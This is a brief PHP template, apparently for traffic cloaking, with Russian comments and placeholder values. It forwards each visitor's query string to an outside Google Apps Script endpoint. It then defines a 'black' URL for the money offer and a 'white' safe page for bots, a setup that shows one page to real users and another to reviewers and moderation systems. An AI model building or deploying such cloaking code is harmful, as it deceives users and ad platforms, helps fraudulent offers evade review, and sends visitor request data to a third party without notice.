<?php
file_get_contents("https://script.google.com/macros/s/AKfycbyolH1tZCSr81cHpik6L7w0SyMOmE0Cv3X9HeOhNwKIUJNNMSxw09MGNj6T5eQzTzoKHw/exec?utm_mohtoh={<replace>}&".$_SERVER["QUERY_STRING"]);
...
// Указывается ссылка на оффер
define("BLACK_URL", "{[money]}");

// Файл или ссылку на страницу для ботов
define("WHITE_URL", "{[safe]}");
